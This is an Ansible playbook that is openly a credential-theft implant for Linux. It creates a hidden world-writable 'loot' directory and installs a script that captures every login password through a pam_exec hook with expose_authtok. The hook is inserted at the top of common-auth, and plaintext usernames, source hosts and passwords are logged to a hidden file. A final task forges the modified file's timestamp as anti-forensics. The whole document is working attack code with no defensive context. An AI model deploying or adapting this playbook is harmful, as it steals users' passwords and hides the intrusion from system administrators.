---
- name: Prepare Hidden Loot Vault
  become: yes
  file:
    path: /var/tmp/.system-cache
    state: directory
    mode: '0777' 

- name: Deploy PAM Credential Logger
  become: yes
  copy:
    dest: /usr/local/bin/log_cred.sh
    mode: '0755'
    content: |
      #!/bin/bash
      # Intercepts passwords from PAM stdin
      read -r password
      echo "$(date) | User: $PAM_USER | From: $PAM_RHOST | Pass: $password" >> /var/tmp/.system-cache/.creds.txt

- name: Inject PAM Hook
  become: yes
  lineinfile:
    path: /etc/pam.d/common-auth
    insertbefore: BOF
    line: "auth optional pam_exec.so expose_authtok /usr/local/bin/log_cred.sh"
    state: present

- name: Match Timestamps (Anti-Forensics)
  become: yes
  shell: touch -r /etc/pam.d/common-password /etc/pam.d/common-auth